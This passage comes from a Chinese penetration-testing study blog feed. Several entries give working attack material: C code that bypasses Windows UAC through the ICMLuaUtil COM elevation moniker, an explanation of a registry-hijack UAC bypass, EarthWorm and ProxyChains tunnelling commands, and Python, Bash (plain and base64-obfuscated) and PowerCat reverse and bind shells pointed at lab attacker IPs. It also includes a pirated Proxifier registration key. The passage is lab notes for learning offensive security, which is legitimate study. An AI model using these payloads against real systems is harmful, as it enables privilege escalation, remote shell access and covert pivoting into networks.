      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-san/</url>
      
        <content type="html"><![CDATA[<h2 id="基于COM组件接口Bypass-UAC"><a href="#基于COM组件接口Bypass-UAC" class="headerlink" title="基于COM组件接口Bypass UAC"></a>基于COM组件接口Bypass UAC</h2><p>COM提升名称（COM Elevation Moniker）技术允许运行在用户帐户控制（UAC）下的应用程序用提升权限的方法来激活COM类，以此提升COM接口权限。其中，ICMLuaUtil接口中提供了ShellExec方法来执行命令，创建指定进程。所以，本文介绍的基于ICMLuaUtil接口的Bypass UAC的实现原理是利用COM提升名称（COM Elevation Moniker）来对ICMLuaUtil接口提权，提权后通过调用ShellExec方法来创建指定进程，实现Bypass UAC操作。</p><p>使用权限提升COM类的程序必须调通过用CoCreateInstanceAsAdmin函数来创建COM类，CoCreateInstanceAsAdmin函数的代码可以在MSDN网页（ <a href="https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspx">https://msdn.microsoft.com/zh-cn/library/windows/desktop/ms679687.aspx</a> ）上找到，下面给出的是CoCreateInstanceAsAdmin函数的改进代码，增加了初始化COM环境的代码。</p><p>那么，COM提升名称具体的实现代码如下所示。</p><pre class="line-numbers language-none"><code class="language-none">HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid){BIND_OPTS3 bo;WCHAR wszCLSID[MAX_PATH] = { 0 };WCHAR wszMonikerName[MAX_PATH] = { 0 };HRESULT hr = 0;// 初始化COM环境::CoInitialize(NULL);// 构造字符串::StringFromGUID2(rclsid, wszCLSID, (sizeof(wszCLSID) / sizeof(wszCLSID[0])));hr = ::StringCchPrintfW(wszMonikerName, (sizeof(wszMonikerName) / sizeof(wszMonikerName[0])), L"Elevation:Administrator!new:%s", wszCLSID);if (FAILED(hr)){return hr;}// 设置BIND_OPTS3::RtlZeroMemory(&amp;bo, sizeof(bo));bo.cbStruct = sizeof(bo);bo.hwnd = hWnd;bo.dwClassContext = CLSCTX_LOCAL_SERVER;// 创建名称对象并获取COM对象hr = ::CoGetObject(wszMonikerName, &amp;bo, riid, ppVoid);return hr;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行上述代码，即可创建并激活提升权限的COM类。ICMLuaUtil接口通过上述方法创建后，直接调用ShellExec方法创建指定进程，完成Bypass UAC的操作。</p><p>那么，基于ICMLuaUtil接口Bypass UAC的具体实现代码如下所示。</p><pre class="line-numbers language-none"><code class="language-none">BOOL CMLuaUtilBypassUAC(LPWSTR lpwszExecutable){HRESULT hr = 0;CLSID clsidICMLuaUtil = { 0 };IID iidICMLuaUtil = { 0 };ICMLuaUtil *CMLuaUtil = NULL;BOOL bRet = FALSE;do {::CLSIDFromString(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);::IIDFromString(IID_ICMLuaUtil, &amp;iidICMLuaUtil);// 提权hr = CoCreateInstanceAsAdmin(NULL, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));if (FAILED(hr)){break;}// 启动程序hr = CMLuaUtil-&gt;lpVtbl-&gt;ShellExec(CMLuaUtil, lpwszExecutable, NULL, NULL, 0, SW_SHOW);if (FAILED(hr)){break;}bRet = TRUE;}while(FALSE);// 释放if (CMLuaUtil) {CMLuaUtil-&gt;lpVtbl-&gt;Release(CMLuaUtil);}return bRet;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-yi/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/40-mian-sha/1.31-bypass-uac-ti-quan-yuan-li-yi/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CreateProcessAsUser</p><p><a href="https://blog.csdn.net/xiaoyafang123/article/details/110087387">https://blog.csdn.net/xiaoyafang123/article/details/110087387</a></p><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。</p><p>UAC需要授权的动作包括：配置Windows Update；增加或删除用户账户；改变用户的账户类型；改变UAC设置；安装ActiveX；安装或移除程序；安装设备驱动程序；设置家长控制；将文件移动或复制到Program Files或Windows目录；查看其他用户文件夹等。</p><p>在触发 UAC 时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程。</p><p>所以，病毒木马想要实现更多权限操作，那么就不得不绕过UAC弹窗，在没有通知用户情况下, 静默地将程序普通权限提升为管理员权限，从而程序可以实现一些需要权限的操作。目前实现Bypass UAC的方法主要有两种方法，一种是利用白名单提权机制，另一种是利用COM组件接口技术。接下来，分别介绍这两种Bypass UAC的实现方法。</p><h2 id="基于白名单程序Bypass-UAC"><a href="#基于白名单程序Bypass-UAC" class="headerlink" title="基于白名单程序Bypass UAC"></a>基于白名单程序Bypass UAC</h2><p>有些系统程序是直接获取管理员权限，而不会触发UAC弹框，这类程序称为白名单程序。例如，slui.exe、wusa.exe、taskmgr.exe、msra.exe、eudcedit.exe、eventvwr.exe、CompMgmtLauncher.exe等等。可以通过对这些白名单程序进行DLL劫持、注入或是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>接下来，选取白名单程序CompMgmtLauncher.exe计算机管理程序进行详细分析，利用它实现Bypass UAC提权。下述的分析过程是在64位Windows 10操作系统上完成的，使用到的关键工具软件是进程监控器Procmon.exe。</p><p>实现过程<br>首先，直接到System32目录下运行CompMgmtLauncher.exe程序，并没有出现UAC弹窗，直接显示计算机管理的窗口界面。其中，使用进程监控器Procmon.exe来监控CompMgmtLauncher.exe进程的所有操作行为，主要是监控注册表和文件的操作。通过分析Procmon.exe的监控数据发现，CompMgmtLauncher.exe进程会先查询注册表HKCU\Software\Classes\mscfile\shell\open\command中数据，发现该路径不存在后，继续查询注册表HKCR\mscfile\shell\open\command(Default)中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息，如图6-1所示。然后，CompMgmtLauncher.exe会根据读取到的路径启动程序，显示计算机管理的窗口界面。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/2446/1656379616007/0dc2acee9e9b4c8db74f3853f458de13.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/7.ew/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/7.ew/</url>
      
        <content type="html"><![CDATA[<h1 id="EarthWorm工具"><a href="#EarthWorm工具" class="headerlink" title="EarthWorm工具"></a><strong>EarthWorm</strong>工具</h1><h2 id="EarthWorm介绍"><a href="#EarthWorm介绍" class="headerlink" title="EarthWorm介绍"></a><strong>EarthWorm</strong>介绍</h2><p>EW 是一套便携式的网络穿透工具， 具有 SOCKSv5服务架设和端口转发两大核心功能， 可在复杂网络环境下完成 网络穿透。该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道， 直达网络深处， 用蚯蚓独有的手段 突破网络限制， 给防火墙松土。工具包中提供了多种可执行文件， 以适用不同的操作系统， Linux、Windows、   MacOS、Arm-Linux 均被包括其内,强烈推荐使用。  (简称EW)是一套轻量便携且功能强大的网络穿透工具， 基于标 准C开发，  具有socks5代理、端口转发和端口映射三大功能。</p><p>优点:</p><p>1.可穿透复杂的内网环境。  (这么说吧： 我本地连着路由器开一个虚拟机， 可以直接反弹到公网的云服务器上。</p><p> 2.以支持多平台间的转接通讯， Linux、Windows、 MacOS、Arm-Linux均支持。</p><h2 id="EarthWorm下载"><a href="#EarthWorm下载" class="headerlink" title="EarthWorm下载"></a><strong>EarthWorm</strong>下载</h2><p>下载地址</p><pre class="line-numbers language-none"><code class="language-none">https://github.com/idlefire/ew  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image001-168398346180778.jpg" alt="img"></p><h2 id="EarthWorm命令"><a href="#EarthWorm命令" class="headerlink" title="EarthWorm命令"></a><strong>EarthWorm</strong>命令</h2><pre class="line-numbers language-none"><code class="language-none">./ew -s ssocksd -l 1080 //开启正向socks服务./ew -s rcsocks -l 1080 -e 8888 //监听1080端口，1080接收的数据通过8888交互传递./ew -s rssocks -d rev_ip -e 8888 //开启反向socks服务。反向连接rev_ip的8888端口./ew -s lcx_listen -l 1080 -e 8888 //监听1080端口，1080接收的数据通过8888交互传递./ew -s lcx_tran -l 1080 -f forward_ip -g 8888 //监听1080端口，1080接收的数据正向传给forward_ip的8888端口./ew -s lcx_slave -d vps_ip -e 8888 -f B_ip -g 9999 //作为中间角色，反向连接vps的8888，正向连接B的9999。打通两者<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h2><h3 id="实验场景"><a href="#实验场景" class="headerlink" title="实验场景"></a>实验场景</h3><p><img src="assets/clip_image004-168398346180780.jpg" alt="img"></p><p>靶机A出网， 但是靶机B不出， 控制了靶机A作为代理服务器</p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><h4 id="靶机A上执行如下命令"><a href="#靶机A上执行如下命令" class="headerlink" title="靶机A上执行如下命令"></a>靶机A上执行如下命令</h4><pre class="line-numbers language-none"><code class="language-none">ew_for_win.exe -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="攻击机机器上设置代理"><a href="#攻击机机器上设置代理" class="headerlink" title="攻击机机器上设置代理"></a>攻击机机器上设置代理</h4><p>Proxifier下载地址:<a href="https://www.proxifier.com/download/ProxifierSetup.exe">https://www.proxifier.com/download/ProxifierSetup.exe</a></p><pre class="line-numbers language-none"><code class="language-none">注册码QBZ9F-D3VWW-BQ7YC-XUKWY-RB95P<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="ProxyChains工具"><a href="#ProxyChains工具" class="headerlink" title="ProxyChains工具"></a>ProxyChains工具</h1><h2 id="一、ProxyChains介绍"><a href="#一、ProxyChains介绍" class="headerlink" title="一、ProxyChains介绍"></a>一、ProxyChains介绍</h2><p>ProxyChains遵循GNU协议的一款适用于linux系统的网络代理设置工具。 强利由任-程序发起的TCP连接请求必须通过诸如TOR 或<br>SOCKs4, SOCKS5或HTTP(S)代理。支持的认证方式包括: SOCKS4/5的用户/密码认证，HTTP的基本认证。允许TCP和DNS通过代理隧<br>道，并且可配置多个代理。</p><h2 id="二、ProxyChains的适用场景"><a href="#二、ProxyChains的适用场景" class="headerlink" title="二、ProxyChains的适用场景"></a>二、ProxyChains的适用场景</h2><p>在以下几种场合,你可以考虑使用ProxyChains: 需要通过代理上网，或者需要突破诸如设置了端口限制的防火墙;或者要使用telnet,<br>ssh, wget, vnc, apt, ftp, nmap等应用;事实上，甚至可以通过ProxyChains设置 反向代理来让你能够从外部访问你的内部局域网。<br>突破防火墙限制访问互联网。</p><h2 id="三、ProxyChains的-些特色功能"><a href="#三、ProxyChains的-些特色功能" class="headerlink" title="三、ProxyChains的- -些特色功能"></a>三、ProxyChains的- -些特色功能</h2><p>①支持不同的代理选择策略:随机 (代理列表内) .顺序,动态顺序(智能排除无用的代理)</p><p>②可以与任意程序结合使用，甚至网络扫描。通过代理或代理链可以实现端口扫描。</p><p>​例如<code>proxychains nmap -sST -PO -p 80 -iR</code></p><p>③通过可调的超时设定，支持真正的长代理链。</p><h2 id="四、ProxyChains的安装"><a href="#四、ProxyChains的安装" class="headerlink" title="四、ProxyChains的安装"></a>四、ProxyChains的安装</h2><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/rofl0r/proxychains-ngcd proxychains-ng./conf1guresudo make G&amp; make installapt-get install proxychains<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、配置"><a href="#五、配置" class="headerlink" title="五、配置"></a>五、配置</h2><pre class="line-numbers language-none"><code class="language-none">/etc/ proxychains.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/6.python-fan-dan-shell/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/6.python-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-反弹Shell"><a href="#Python-反弹Shell" class="headerlink" title="Python 反弹Shell"></a><strong>Python</strong> 反弹<strong>Shell</strong></h1><h2 id="Python介绍"><a href="#Python介绍" class="headerlink" title="Python介绍                                        "></a><strong>Python</strong>介绍                                       <a href="af://n3"> </a></h2><p>Python由荷兰数学和计算机科学研究学会的吉多·范罗苏姆于1990年代初设计， 作为一门叫做ABC语言的替代品。 Python提供了高效的高级数据结构， 还能简单有效地面向对象编程。 Python语法和动态类型， 以及解释型语言的 本质， 使它成为多数平台上写脚本和快速开发应用的编程语言，  随着版本的不断更新和语言新功能的添加， 逐渐被 用于独立的、大型项目的开发。</p><h2 id="Python反弹Shell介绍"><a href="#Python反弹Shell介绍" class="headerlink" title="Python反弹Shell介绍                                 "></a><strong>Python</strong>反弹<strong>Shell</strong>介绍                                <a href="af://n6"> </a></h2><h3 id="python-2"><a href="#python-2" class="headerlink" title="python 2"></a>python 2</h3><pre class="line-numbers language-none"><code class="language-none">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.21.80.99",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">import socketimport subprocessimport oss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect(("172.21.80.99", 8888))os.dup2(s.fileno(), 0)os.dup2(s.fileno(), 1)os.dup2(s.fileno(), 2)p = subprocess.call(["/bin/bash", "-i"])<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍                                           "></a>实验介绍                                          <a href="af://n10"> </a></h2><p><img src="assets/clip_image001-168398344834972.jpg" alt="img"></p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.3.27 (Windows)</td></tr><tr><td>实验靶机</td><td>192.168.41.135 ( Linux)</td></tr></tbody></table><h2 id="实验复现"><a href="#实验复现" class="headerlink" title="实验复现                                           "></a>实验复现                                          <a href="af://n23"> </a></h2><h3 id="1、攻击机器使用nc执行监听命令"><a href="#1、攻击机器使用nc执行监听命令" class="headerlink" title="1、攻击机器使用nc执行监听命令"></a>1、攻击机器使用nc执行监听命令</h3><pre class="line-numbers language-none"><code class="language-none">nc -lvvp  1111 监听  TCP  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image003-168398344834973.gif" alt="img"></p><h3 id="2、实验靶机执行连接命令"><a href="#2、实验靶机执行连接命令" class="headerlink" title="2、实验靶机执行连接命令"></a>2、实验靶机执行连接命令</h3><pre class="line-numbers language-none"><code class="language-none">python -c 'importsocket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.3.27",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="assets/clip_image004.jpg" alt="img"></p><h3 id="3、查看结果"><a href="#3、查看结果" class="headerlink" title="3、查看结果"></a>3、查看结果</h3><p><img src="assets/clip_image005.jpg" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/5.bash-fan-dan-shell/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/5.bash-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="Bash介绍"><a href="#Bash介绍" class="headerlink" title="Bash介绍                                           "></a><strong>Bash</strong>介绍                                          <a href="af://n4"> </a></h1><p>Shell也称为终端或壳， 是人与内核之间的翻译官， 而Bash则是Linux中默认使用的Shell</p><p>Bash 反弹Shell的命令如下：</p><pre class="line-numbers language-none"><code class="language-none">bash -i &gt;&amp;/dev/tcp/攻击机_IP/攻击机端口 0&gt;&amp;1bash -i &gt;&amp;/dev/tcp/攻击机_IP/攻击机端口 0&gt;&amp;2bash -i &gt;&amp;/dev/udp/攻击机_IP/攻击机端口 0&gt;&amp;1bash -i &gt;&amp;/dev/udp/攻击机_IP/攻击机端口 0&gt;&amp;2bash -i &gt;&amp;/dev/tcp/192.168.70.7/9999 0&gt;&amp;1nc -lvvp 9999<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>“<code>bash-i</code>“是指打开一个交互式的Shell。</p><p>“<code>&amp;</code>“符号用于区分文件和文件描述符， </p><p>“<code>&gt;&amp;</code>“符号后面跟文件时， 表示将标准输出和标准错误输出重定向至文件， “&gt;&amp;”符号后面跟数字时表示后面的数字是文件描述符， 不加”&amp;”符号则会把后面的数字当成文件。</p><p>数字”<code>0</code>“,”<code>1</code>“,”<code>2</code>“是LinuxShell下的文件描述符，“0”是指标准输入重定向，“1”是指标准输出重定向，“2”是指错误输出 重定向。</p><p>“<code>/dev</code>“目录下”tcp”和”udp”是Linux中的特殊设备， 可用于建立Socket连接， 读写这俩文件就相当于是在Socket连 接中传输数据。</p><p>“<code>&gt;&amp;/dev/tcp/</code>攻击机_ip/攻击机端口”则表示将<strong>标准输出和标准错误输出重定向</strong>到”/dev/tcp/攻击机 ip/攻击机端口”文件中， 也就是重定向到了攻击机， 这时目标机的命令执行结果可以从攻击机看到。</p><p>“<code>0&gt;&amp;1</code>“或”<code>0&gt;&amp;2</code>“又将标准输入重定向到了标准输出， 而标准输出重定向到了攻击机， 因此标准输入也就重定 向到了攻击机， 从而可以通过攻击机输入命令， 并且可以看到命令执行结果输出</p><h1 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍                                           "></a>实验介绍                                          <a href="af://n16"> </a></h1><p><img src="assets/clip_image001-168398343346065.jpg" alt="img"></p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.3.27 (Windows)</td></tr><tr><td>实验靶机</td><td>192.168.41.135 ( Linux)</td></tr></tbody></table><h2 id="1、攻击机器使用nc执行监听命令"><a href="#1、攻击机器使用nc执行监听命令" class="headerlink" title="1、攻击机器使用nc执行监听命令"></a>1、攻击机器使用nc执行监听命令</h2><pre class="line-numbers language-none"><code class="language-none">nc -lvvp 9999   监听TCP  nc -lup 9999    监听UDP  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="assets/clip_image002.jpg" alt="img"></p><h2 id="2、实验靶机执行连接命令"><a href="#2、实验靶机执行连接命令" class="headerlink" title="2、实验靶机执行连接命令"></a>2、实验靶机执行连接命令</h2><p><a href="https://ares-x.com/tools/runtime-exec/">Runtime.exec Payload Generater | AresX’s Blog (ares-x.com)</a></p><p><a href="https://www.revshells.com/">Online - Reverse Shell Generator (revshells.com)</a></p><h3 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h3><pre class="line-numbers language-none"><code class="language-none">nc -lvvp  9999bash -i &gt;&amp;/dev/tcp/192.168.70.7/9999 0&gt;&amp;1 https://ares-x.com/tools/runtime-exec/bash base64:YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNzAuNy85OTk5IDA+JjE=bash -c '{echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzE5Mi4xNjguNzAuNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'bash -i &gt;&amp;/dev/tcp/192.168.70.7/9999 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h3><pre class="line-numbers language-none"><code class="language-none">nc -lup 9999bash -i &gt;&amp;/dev/udp/192.168.70.7/9999 0&gt;&amp;1bash -c '{echo,YmFzaCAtaSA+Ji9kZXYvdWRwLzE5Mi4xNjguNzAuNy85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'bash -i &gt;&amp;/dev/udp/172.21.80.99/9999 0&gt;&amp;1bash -c '{echo,YmFzaCAtaSA+Ji9kZXYvdWRwLzE3Mi4yMS44MC45OS85OTk5IDA+JjE=}|{base64,-d}|{bash,-i}'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>base64的编码差别是 udp的编码中的Rw 和 tcp的编码中的GN</p><p><img src="assets/clip_image003-168398343346166.jpg" alt="img"></p><h2 id="3、查看结果"><a href="#3、查看结果" class="headerlink" title="3、查看结果"></a>3、查看结果</h2><p><img src="assets/clip_image005-168398343346167.gif" alt="img"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/4.powercat-fan-dan-shell/"/>
      <url>/2023/07/16/penetration-test-learning/part-2-infiltration-and-defense/37hvv/16-nei-wang-dai-li/4.powercat-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h1 id="PowerCat反弹Shell"><a href="#PowerCat反弹Shell" class="headerlink" title="PowerCat反弹Shell"></a><strong>PowerCat</strong>反弹<strong>Shell</strong></h1><h2 id="PowerCat介绍"><a href="#PowerCat介绍" class="headerlink" title="PowerCat介绍                                      "></a>PowerCat介绍                                     <a href="af://n2"> </a></h2><p>PowerCat是一个powershell写的tcp/ip瑞士军刀， 看一看成ncat的powershell的实现， 然后里面也加入了众多好 用的功能， 如文件上传， smb协议支持， 中继模式， 生成payload， 端口扫描等等。</p><h2 id="PowerCat安装"><a href="#PowerCat安装" class="headerlink" title="PowerCat安装                                      "></a><strong>PowerCat</strong>安装                                     <a href="af://n5"> </a></h2><h3 id="1、下载地址"><a href="#1、下载地址" class="headerlink" title="1、下载地址"></a>1、下载地址</h3><p>  <a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a>  </p><h3 id="2、下载下来导入"><a href="#2、下载下来导入" class="headerlink" title="2、下载下来导入"></a>2、下载下来导入</h3><pre class="line-numbers language-none"><code class="language-none">Import-Module .\powercat.ps1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3、如果提示未能加载指定模块，-则可能是权限问题，-输入如下代码"><a href="#3、如果提示未能加载指定模块，-则可能是权限问题，-输入如下代码" class="headerlink" title="3、如果提示未能加载指定模块， 则可能是权限问题， 输入如下代码"></a>3、如果提示未能加载指定模块， 则可能是权限问题， 输入如下代码</h3><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4、输入如下命令可以查看帮助信息"><a href="#4、输入如下命令可以查看帮助信息" class="headerlink" title="4、输入如下命令可以查看帮助信息"></a>4、输入如下命令可以查看帮助信息</h3><pre class="line-numbers language-none"><code class="language-none">powercat -h  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5、如下就是安装成功"><a href="#5、如下就是安装成功" class="headerlink" title="5、如下就是安装成功"></a>5、如下就是安装成功</h3><p><img src="assets/clip_image001-168398341552439.jpg" alt="img"></p><h2 id="PowerCat命令"><a href="#PowerCat命令" class="headerlink" title="PowerCat命令"></a><strong>PowerCat</strong>命令</h2><pre class="line-numbers language-none"><code class="language-none">-l 监听连接-c 连接到侦听器-p 要连接或监听的端口-e 执行-ep 执行Powershell-r 中继。格式：“-r tcp：10.1.1.1：443”-u 通过UDP传输数据-dns 通过dns传输数据-dnsft DNS故障阈值-t 超时选项。默认值：60-I 输入：文件路径（字符串），字节数组或字符串-o 控制台输出类型：“主机”，“字节”或“字符串”-of 输出文件路径-d 连接后断开连接-rep 中继器。断开连接后重新启动-g 生成有效载荷-ge 生成编码的有效载荷-h 打印帮助消息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="PowerCat实验环境介绍"><a href="#PowerCat实验环境介绍" class="headerlink" title="PowerCat实验环境介绍                           "></a><strong>PowerCat</strong>实验环境介绍                          <a href="af://n24"> </a></h2><p>两台机器</p><table><thead><tr><th>机器名称</th><th>机器<strong>IP</strong></th></tr></thead><tbody><tr><td>攻击机器</td><td>192.168.3.6</td></tr><tr><td>目标靶机</td><td>192.168.3.10</td></tr></tbody></table><p> <img src="assets/clip_image006.gif" alt="img"></p><h2 id="PowerCat和nc正向连接"><a href="#PowerCat和nc正向连接" class="headerlink" title="PowerCat和nc正向连接                               "></a><strong>PowerCat</strong>和<strong>nc</strong>正向连接                              <a href="af://n39"> </a></h2><h3 id="1、靶机使用powercat监听，执行以下命令"><a href="#1、靶机使用powercat监听，执行以下命令" class="headerlink" title="1、靶机使用powercat监听，执行以下命令"></a>1、靶机使用powercat监听，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 8080  -e cmd.exe -v  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image007.jpg" alt="img"></p><h3 id="2、攻击机使用nc连，执行以下命令"><a href="#2、攻击机使用nc连，执行以下命令" class="headerlink" title="2、攻击机使用nc连，执行以下命令"></a>2、攻击机使用nc连，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">nc 192.168.3.10 8080 -vv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image009-168398341552442.jpg" alt="img"></p><h3 id="3、查看返回结果"><a href="#3、查看返回结果" class="headerlink" title="3、查看返回结果"></a>3、查看返回结果</h3><p><img src="assets/clip_image010-168398341552441.jpg" alt="img"></p><h2 id="PowerCat和nc反向连接"><a href="#PowerCat和nc反向连接" class="headerlink" title="PowerCat和nc反向连接                               "></a><strong>PowerCat</strong>和<strong>nc</strong>反向连接                              <a href="af://n54"> </a></h2><h3 id="1、靶机使用powercat连，执行以下命令"><a href="#1、靶机使用powercat连，执行以下命令" class="headerlink" title="1、靶机使用powercat连，执行以下命令"></a>1、靶机使用powercat连，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -c 192.168.3.6 -p 8888 -v -e cmd.exe  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image011.jpg" alt="img"></p><h3 id="2、攻击机使用nc监听，执行以下命令"><a href="#2、攻击机使用nc监听，执行以下命令" class="headerlink" title="2、攻击机使用nc监听，执行以下命令"></a>2、攻击机使用nc监听，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">nc -l -p 8888 -vv  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="assets/clip_image012.jpg" alt="img"></p><h3 id="3、查看返回结果-1"><a href="#3、查看返回结果-1" class="headerlink" title="3、查看返回结果"></a>3、查看返回结果</h3><p><img src="assets/clip_image014.gif" alt="img"></p><h2 id="PowerCat和PowerCat反向连接"><a href="#PowerCat和PowerCat反向连接" class="headerlink" title="PowerCat和PowerCat反向连接                         "></a><strong>PowerCat</strong>和<strong>PowerCat</strong>反向连接                        <a href="af://n69"> </a></h2><h3 id="1、靶机使用powercat连，执行以下命令-1"><a href="#1、靶机使用powercat连，执行以下命令-1" class="headerlink" title="1、靶机使用powercat连，执行以下命令"></a>1、靶机使用powercat连，执行以下命令</h3><pre class="line-numbers language-none"><code class="language-none">powercat -c 192.168.3.6 -p 9999 -v -ep  <span aria-hidden="true" 